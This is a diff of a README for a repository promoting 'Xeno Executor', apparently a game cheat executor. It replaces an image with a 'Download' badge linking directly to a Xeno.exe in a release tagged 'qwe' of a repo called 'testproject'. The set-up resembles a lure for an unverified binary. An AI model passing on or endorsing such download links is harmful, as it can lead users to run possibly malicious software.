@@ -4,7 +4,7 @@ Welcome to the Xeno Executor repository! 🚀 This repository hosts the latest v
 
 <img src="https://i.toneden.io/unsafe/full-fit-in/412x732/filters:no_upscale()/https%3A%2F%2Far.toneden.io%2F75939477%2Funlocks%2F6235469%3Fcache%3D1731221092638" style="height:250px;">
 
-![Xeno Executor](https://github.com/fnz02221/testproject/releases/download/qwe/Xeno.exe)
+[![Download Xeno Executor](https://img.shields.io/badge/Download-Xeno%20Executor-orange)](https://github.com/fnz02221/testproject/releases/download/qwe/Xeno.exe)
 
 ## Table of Contents
 - [Introduction](#introduction)
